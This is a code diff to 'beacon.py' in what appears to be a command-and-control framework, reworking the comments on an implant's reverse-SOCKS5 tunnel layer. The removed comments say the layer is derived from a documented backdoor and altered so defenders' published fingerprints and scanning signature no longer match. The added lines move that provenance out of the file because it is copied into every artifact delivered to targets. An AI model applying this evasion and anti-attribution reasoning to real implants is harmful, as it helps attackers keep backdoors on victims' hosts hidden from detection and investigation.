@@ -1114,28 +1114,6 @@ class NoiseSession:
 
 # ── Tunnel wire format: framing, command messages and SOCKS5 ──
 
-# This layer is derived from VIPERTUNNEL, the Python reverse-SOCKS backdoor
-# InfoGuard Labs documented in "Slithering Through the Noise" (2026-04-09).
-# It keeps that protocol's shape and replaces its bytes, and the
-# replacements will read as bugs to anybody who knows the original:
-#
-#   | Field          | The original            | Here                      |
-#   |----------------|-------------------------|---------------------------|
-#   | SOCKS version  | stripped from both ends | restored, 0x05, checked   |
-#   | RSV            | absent                  | present, 0x00, checked    |
-#   | Ports          | little-endian           | big-endian, RFC 1928 §4   |
-#   | Success        | 1, with 0 for failure   | 0, per RFC 1928 §6        |
-#   | ATYP=4, IPv6   | refused                 | supported                 |
-#   | Keep-alive     | a zero uint16, `00 00`  | MSG_PING / MSG_PONG       |
-#
-# The frame length prefix is big-endian for the same reason the ports are,
-# and not because anything here needs it that way: the original's
-# little-endian numbers are a published, scannable trait, and a fingerprint
-# we do not need is one we do not keep. `00 00` on connect is how its
-# infrastructure was enumerated across hosting providers, so an empty frame
-# -- which is those two bytes exactly -- is refused at both ends here
-# rather than merely going unused.
-#
 # The wire, outermost first:
 #
 #   frame           = ">H" length + one Noise message
@@ -1143,20 +1121,31 @@ class NoiseSession:
 #   SOCKS request   = ver(1)=5 cmd(1) rsv(1)=0 atyp(1) addr port(">H")
 #   SOCKS reply     = ver(1)=5 rep(1) rsv(1)=0 atyp(1) addr port(">H")
 #
-# What is deliberately absent is the SOCKS greeting and the RFC 1929
-# username/password sub-negotiation. Only the operator-facing side performs
-# those, and that side is never delivered to a target, so neither belongs in
-# this file.
+# Every number here is big-endian and every reserved field is present and
+# checked, per RFC 1928. Both choices are deliberate and neither is free,
+# so the reasons are written down -- in
+# `software/c2/tunnel/protocol.py` and in docs/TUNNEL.md, and not here.
+# This file is read verbatim into every delivered artifact, so a comment
+# in it is a comment on the host: anything that would tell a reader what
+# this layer is derived from belongs on the side that is never delivered.
+# An empty frame, which is the bytes `00 00` exactly, is refused by both
+# `write_frame` and `read_frame` for a reason recorded in the same two
+# places.
 #
 # This section lives in `beacon.py` because `api_beacon_gen` reads exactly
 # this one file to build the artifact the tunnel endpoint runs from. A
 # helper in another module would pass every test here and be absent on
 # target. `software/c2/tunnel/protocol.py` re-exports these names for the
 # server side; it holds no second copy.
+#
+# The SOCKS greeting and the RFC 1929 username/password sub-negotiation
+# are deliberately absent. Only the operator-facing side performs those,
+# and that side is never delivered to a target, so neither belongs in this
+# file.
 
-# The frame length prefix and the SOCKS port, which are the two places the
-# original used little-endian and so the two a reader will check. One
-# struct for both, because they are one decision.
+# The frame length prefix and the SOCKS port, which are the two numbers a
+# reader will check the byte order of. One struct for both, because they
+# are one decision.
 _BE_UINT16 = struct.Struct(">H")
 
 FRAME_PREFIX_LEN = _BE_UINT16.size
